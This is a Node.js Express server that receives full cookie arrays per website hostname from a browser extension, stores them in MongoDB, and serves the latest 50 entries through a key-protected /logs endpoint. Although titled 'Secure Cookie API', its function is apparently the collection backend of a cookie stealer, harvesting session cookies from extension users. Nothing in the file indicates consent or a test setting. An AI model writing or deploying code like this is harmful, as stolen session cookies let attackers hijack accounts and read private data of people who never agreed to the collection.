require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const cors = require("cors");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 5000;

// Security headers
app.use(helmet());

// Basic rate-limiting
app.use(rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 60 // limit each IP to 60 requests per windowMs
}));

// CORS: allow only your extension origin (set in Render env)
const allowedOrigin = process.env.ALLOWED_ORIGIN || "";
app.use(cors({
  origin: allowedOrigin,
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "x-api-key"]
}));

app.use(express.json({ limit: "10mb" }));

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URL, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log("MongoDB connected");
}).catch(err => {
  console.error("MongoDB connection error:", err);
});

// Schema
const CookieSchema = new mongoose.Schema({
  hostname: String,
  cookies: Array,
  createdAt: { type: Date, default: Date.now }
});
const CookieLog = mongoose.model("CookieLog", CookieSchema);

// Protected endpoint
app.post("/collect", async (req, res) => {
  try {
    const key = req.headers["x-api-key"];
    if (!key || key !== process.env.EXTENSION_API_KEY) {
      return res.status(403).json({ error: "Unauthorized" });
    }

    const { hostname, cookies } = req.body;
    if (!hostname || !Array.isArray(cookies)) {
      return res.status(400).json({ error: "Invalid payload" });
    }

    await CookieLog.create({ hostname, cookies });
    return res.json({ success: true, message: "Stored", count: cookies.length });
  } catch (err) {
    console.error("collect error:", err);
    return res.status(500).json({ error: "Server error" });
  }
});

// Optional: view latest N entries (protected)
app.get("/logs", async (req, res) => {
  try {
    const key = req.headers["x-api-key"];
    if (!key || key !== process.env.EXTENSION_API_KEY) {
      return res.status(403).json({ error: "Unauthorized" });
    }
    const items = await CookieLog.find().sort({ createdAt: -1 }).limit(50).lean();
    res.json(items);
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/", (req, res) => res.send("Secure Cookie API running"));

app.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
